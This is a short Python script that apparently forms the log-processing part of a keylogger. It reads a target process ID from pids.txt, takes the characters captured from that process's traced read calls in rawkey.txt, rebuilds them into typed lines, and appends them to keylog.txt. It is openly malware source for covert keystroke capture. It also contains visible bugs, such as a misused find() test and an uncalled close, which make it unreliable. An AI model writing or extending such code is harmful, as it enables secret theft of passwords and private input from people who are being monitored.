import os
import re

def getPID():
	pid_file_reader = open("pids.txt",'r')
	pid_array = pid_file_reader.read().split('\n')
	rs_pid = pid_array[0]
	pid_file_reader.close()
	print(rs_pid)
	return rs_pid
	
def parse_rawkeys():
	rk_file = open('rawkey.txt','r')
	kl_file = open('keylog.txt','a')
	
	#list to store collection of lines
	keylog = []
	#list to store line
	line_buf = []

	#read in each line from file, if the line is a 'read' call then 
	#extract the read input	
	for line in rk_file.readlines():
		if ('\"' in line and line.find('-')):
			search_obj = re.search(r'[^.]*\"([^.]*)\"',line) 
			if(search_obj):
				word = search_obj.group(1)
			if  word != "\\n":
				line_buf.append(word)
			else:
				kl_file.write(''.join(line_buf)+'\n')
				line_buf[:] = []			
	kl_file.write(''.join(line_buf))
	rk_file.close()
	kl_file.close()
	open('rawkey.txt','w').close
